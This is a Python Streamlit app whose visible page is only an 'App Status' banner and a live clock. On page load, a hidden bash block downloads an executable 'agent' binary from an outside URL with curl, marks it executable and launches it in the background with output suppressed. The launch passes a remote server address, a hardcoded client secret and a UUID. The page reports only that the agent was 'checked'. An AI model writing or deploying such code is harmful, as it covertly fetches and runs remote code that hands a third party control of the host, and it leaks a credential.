import streamlit as st
import subprocess
from datetime import datetime
import time

# --- Konfigurasi Halaman ---
st.set_page_config(
    page_title="App Status",
    page_icon="🟢",
    layout="centered"
)

# --- Perintah Shell yang Lebih Kompatibel ---
# Menggunakan 'ps' dan 'grep' sebagai ganti 'pgrep' yang mungkin tidak ada.
COMMAND_TO_RUN_ONCE = """
# Langkah 1: Unduh dan siapkan file agent HANYA jika belum ada.
if [ ! -f agent ]; then
    echo "File 'agent' tidak ditemukan, mengunduh..."
    curl -L https://alice.mxflower.eu.org/d/CF%20R2/database/nezha_agent -o agent && chmod +x agent
fi

# Langkah 2: Jalankan agent HANYA jika prosesnya belum berjalan.
# 'ps aux | grep "[a]gent"' adalah cara yang lebih portabel untuk memeriksa proses.
# Trik [a]gent mencegah grep menemukan dirinya sendiri.
# 'wc -l' menghitung jumlah baris. Jika 0, berarti proses tidak ditemukan.
AGENT_PROCESS_COUNT=$(ps aux | grep "[a]gent" | wc -l)

if [ "$AGENT_PROCESS_COUNT" -eq 0 ]; then
    echo "Proses 'agent' tidak berjalan, memulai..."
    nohup env NZ_SERVER=vps-monitor.fly.dev:443 \
        NZ_TLS=true \
        NZ_CLIENT_SECRET=CqmryaDkXPUPoRtdGE8NvfGhjEOLu2b9 \
        NZ_UUID=6505d69d-e932-405f-aace-06c7c9d1e09d \
        ./agent > /dev/null 2>&1 &
else
    echo "Proses 'agent' sudah berjalan."
fi
"""

# --- Logika Eksekusi Otomatis ---

if 'agent_triggered' not in st.session_state:
    st.session_state.agent_triggered = False

if not st.session_state.agent_triggered:
    try:
        st.info("🚀 Memeriksa status agent di latar belakang...")
        
        # Jalankan script pengecekan menggunakan /bin/bash
        subprocess.Popen(COMMAND_TO_RUN_ONCE, shell=True, executable='/bin/bash')
        
        st.session_state.agent_triggered = True
        
        st.toast("Pemeriksaan agent selesai!", icon="👍")
        time.sleep(2)
        
        st.rerun()

    except Exception as e:
        st.error(f"❌ Terjadi kesalahan saat memeriksa/memulai agent:")
        st.code(str(e))
        st.stop()


# --- Tampilan Utama (UI) ---

st.title("🟢 App Status")
st.success("Aplikasi berjalan. Agent telah diperiksa dan aktif di latar belakang.")
st.markdown("---")

clock_placeholder = st.empty()

while True:
    now = datetime.now()
    clock_placeholder.metric(
        label="Waktu Server Saat Ini",
        value=now.strftime("%H:%M:%S"),
        delta=now.strftime('%d %B %Y'),
        delta_color="off"
    )
    time.sleep(1)
